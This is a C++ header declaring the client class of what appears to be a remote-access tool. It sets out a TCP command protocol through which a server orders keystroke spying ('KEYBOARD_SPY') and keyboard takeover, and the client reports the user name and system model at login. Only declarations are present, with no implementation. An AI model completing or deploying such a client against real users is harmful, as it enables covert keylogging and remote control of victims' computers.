
#ifndef ZEROCLIENT_H
#define ZEROCLIENT_H

#include "tcpsocket.h"
#include <iostream>
#include <string>
#include <map>
#include <vector>
#include "keyboardspy.h"
#include "keyboardstop.h"
#include "keyboardtakeover.h"


class ZeroClient
{
public:
    ZeroClient();

    HINSTANCE hInst;    // 本应用程序的实例句柄

    // 服务端向客户端发送的指令(你觉得有需要你也可以增加自己的指令)

    const std::string CmdKeyboardSpy = "KEYBOARD_SPY";
    const std::string CmdKeyboardStop = "KEYBOARD_Stop";
    const std::string CmdKeyboardTakeOver = "KEYBOARD_TakeOver";

    const std::string CmdSendMessage = "SEND_MESSAGE";

    // 客户端向服务端发送的指令(你觉得有需要你也可以增加自己的指令)
    const std::string CmdLogin = "LOGIN";

    // 分割符号和结束符号，比如登入命令:LOGIN<分割符>SYSTEM<分割符>Windows 7<分割符>USER_NAME<分割符>sumkee911<结束符号>
    const std::string CmdSplit = ";";
    const std::string CmdEnd = "\r\n";

    // 连接至服务端
    void connectTo(std::string domain, int port);

    BOOL KeyboardChanged=false;
    std::string controlmessage;

private:
    TcpSocket mSock;    // 与服务端连接的socket
    std::string mBuf;    // 数据缓冲区

    // 获取本机用户名和系统型号
    std::string getUserName();
    std::string getSystemModel();

    // 发送命令
    bool sendLogin();

    // 数据处理函数
    void addDataToBuffer(char *data, int size);
    void processCmd(std::string &cmd, std::string &data);
    std::map<std::string, std::string> parseArgs(std::string &data);

    // 相应于各个指令的处理函数
    void doKeyboardSpy(std::map<std::string, std::string> &args);
    void doKeyboardStop(std::map<std::string, std::string> &args);
    void doKeyboardTakeOver(std::map<std::string, std::string> &args);
    void doSendMessage(std::map<std::string, std::string> &args);



};

#endif // ZEROCLIENT_H
